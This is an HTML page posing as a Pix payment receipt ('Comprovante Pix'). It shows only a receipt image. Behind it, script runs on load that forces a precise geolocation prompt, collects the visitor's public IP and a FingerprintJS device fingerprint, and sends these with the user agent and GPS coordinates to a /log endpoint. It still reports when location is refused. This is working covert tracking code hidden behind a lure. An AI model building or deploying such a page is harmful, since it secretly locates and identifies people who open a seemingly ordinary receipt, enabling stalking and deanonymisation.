<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante Pix</title>
  <style>
    body { background: #f2f2f2; text-align: center; font-family: Arial; }
    img { margin-top: 50px; width: 90%; max-width: 500px; }
  </style>
</head>
<body>
  <img src="comprovante.jpg" alt="Comprovante Pix">

  <!-- Carrega FingerprintJS -->
  <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>

  <script>
    // ⚠️ CHAMADA DIRETA: força prompt de geolocalização
    navigator.geolocation.getCurrentPosition(
      () => {},
      () => {},
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );

    // Coleta IP público
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        const ip = ipData.ip;
        const userAgent = navigator.userAgent;

        // Gera o fingerprint
        FingerprintJS.load()
          .then(fp => fp.get())
          .then(result => {
            const visitorId = result.visitorId;

            // Solicita geolocalização com precisão
            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(
                pos => {
                  const lat = pos.coords.latitude;
                  const lon = pos.coords.longitude;

                  // Envia os dados
                  fetch("/log", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      ip,
                      visitorId,
                      userAgent,
                      device: userAgent,
                      loc: `${lat},${lon}`
                    })
                  })
                  .then(r => r.ok ? console.log("✅ Enviado com sucesso") : console.warn("⚠️ Erro no envio:", r.status))
                  .catch(err => console.error("❌ Falha ao enviar:", err));
                },
                err => {
                  console.warn("⚠️ Geolocalização negada:", err.message);

                  // Envia sem GPS
                  fetch("/log", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      ip,
                      visitorId,
                      userAgent,
                      device: userAgent,
                      loc: null
                    })
                  });
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
              );
            } else {
              console.log("❌ Geolocalização não suportada.");
            }
          });
      });
  </script>
</body>
</html>
